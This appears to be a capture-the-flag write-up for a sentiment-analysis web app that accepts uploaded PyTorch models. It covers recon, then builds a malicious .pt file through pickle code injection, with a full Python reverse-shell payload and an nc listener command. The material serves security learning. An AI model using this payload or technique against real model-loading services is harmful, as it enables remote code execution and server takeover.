# Persuade CTF :arrow_forward: Solution

Lets explore the application :eyes:, it has an Upload and Analyze function. Application is expecting file with .pt extension. With a bit of googling we can know that .pt files are machine learning models created with PyTorch.

Looking at the Analyze function, we have the option to select the already available model "safe_model.pt" from dropdown menu and input a statement for sentiment analysis :computer:.

![Alt text](../Images/Web_App1.PNG?raw=true "Web_App1")

![Alt text](../Images/Web_App2.PNG?raw=true "Web_App2")

Well, that's it. We just know application can do sentiment analysis on user inputs on custom models provided by the user or its on in-build model. But we don't know what model is already available in the application expect its name, which is a custom name and of no use :no_good: for us.

Hmmm... Maybe we will start with a normal dirb to get more info, if application is hiding :alien: something in its directories.

![Alt text](../Images/Dirb_Scan.PNG?raw=true "Dirb_Scan")

Looks like application has robots.txt :page_facing_up:, Ah classic..

![Alt text](../Images/Robots_txt.PNG?raw=true "Robots_txt")

Base64 encoded string (L2JhY2tlbmRfZG9jcy9teWZpbGUudHh0==) sure looks interesting, lets decode it.

![Alt text](../Images/base64.PNG?raw=true "base64")

Yep, its an URL path to a txt file, will access the same in browser.

![Alt text](../Images/backend_docs.PNG?raw=true "backend_docs")

This looks like a break through. This can be actual name of the model used in the application. Only one way to know. A quick google search :mag: reveals cardiffnlp/twitter-roberta-base-sentiment is model available in https://huggingface.co/cardiffnlp/twitter-roberta-base-sentiment :boom:. 

That's again good news, at least its not a rabbit hole :rabbit:. And huggingface has code to download and use the model. 

![Alt text](../Images/huggingface.PNG?raw=true "huggingface")

Lets download the model. Had been always in love :sparkling_heart: with Google Colab for running code related to machine learning.

```python
#Note: This code works well in Google Colab
  
!pip install -q torch==2.0.1
!pip install -q transformers==4.31.0
!pip install -q scipy==1.11.1

import torch
import os
from transformers import AutoModelForSequenceClassification

# Save a model for sentiment analysis
model_directory = "SavedModels"
if not os.path.isdir(model_directory):
    os.mkdir(model_directory)

safe_model_path = os.path.join(model_directory, "saved_model.pt")

task = "sentiment"
MODEL = f"cardiffnlp/twitter-roberta-base-{task}"
# PT
model = AutoModelForSequenceClassification.from_pretrained(MODEL)
torch.save(model,safe_model_path)
```

Now we have the model (saved_model.pt) which is used by the application in its backend. What's next :question: Remember how we identified in beginning that .pt files are machine learning models created with PyTorch. Maybe exploring PyTorch gives us some hints :zap:. Two particular methods (torch.save https://pytorch.org/docs/stable/generated/torch.save.html & torch.load https://pytorch.org/docs/stable/generated/torch.load.html) from PyTorch looks interesting. Below snippet is taken from PyTorch docs which tells us while a model is being loaded in the application PyTorch uses pickle module :file_folder: for deserializing the model file.

![Alt text](../Images/torch_issue.PNG?raw=true "torch_issue")

If you are into security domain, you should know how dangerous :skull: pickle module can be. Back into our CTF, we know application accepts custom model file from user and load that file for sentiment analyzes using PyTorch. Maybe the downloaded model is already malicious :japanese_ogre:, lets make sure its not using modelscan https://github.com/protectai/modelscan. 

`modelscan -p safe_model.pt`

![Alt text](../Images/modelscan.PNG?raw=true "modelscan")

Its not a malicious model after all :exclamation:. But we know there is a possibility for us to make a malicious model file with PyTorch and pickle module. Yet how can we make a model? :thought_balloon: We don't have enough training data or even enough hardware requirements to build and train a model. No worries, we can leverage modelscan's https://github.com/protectai/modelscan/blob/main/notebooks/utils/pickle_codeinjection.py to build a malicious model. We can tweak the saved model (saved_model.pt) to have malicious character. Lets head into Colab once more and execute below code blocks in same notebook you used to download safe_model.pt

`!git clone https://github.com/protectai/modelscan.git`

```python
#Note: This code works well in Google Colab

!git clone https://github.com/protectai/modelscan.git

import torch
import os
from modelscan.notebooks.utils.pickle_codeinjection import PickleInject, get_payload

command = "system"
malicious_code = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    """

unsafe_model_path = os.path.join(model_directory, "unsafe_model_pyshell.pt")

payload = get_payload(command, malicious_code)
torch.save(
    torch.load(safe_model_path),
    f=unsafe_model_path,
    pickle_module=PickleInject([payload]),
)
```

And we got our malicious model (unsafe_model_rshell.pt) :space_invader:. Lets try that in the application. Before that make sure, you have a listener up `nc -lvnp 9000`

Hurray :sunglasses:, once we upload model unsafe_model_rshell.pt in application and select that model to run the sentiment analysis on a statement, we can see the application loads our model with torch.load which unpickles our arbitrary code in model and gives us a reverse shell plus proper sentiment analysis result in web application. 

![Alt text](../Images/Unsafemodel_1.PNG?raw=true "Unsafemodel_1")

![Alt text](../Images/Unsafemodel_2.PNG?raw=true "Unsafemodel_2")
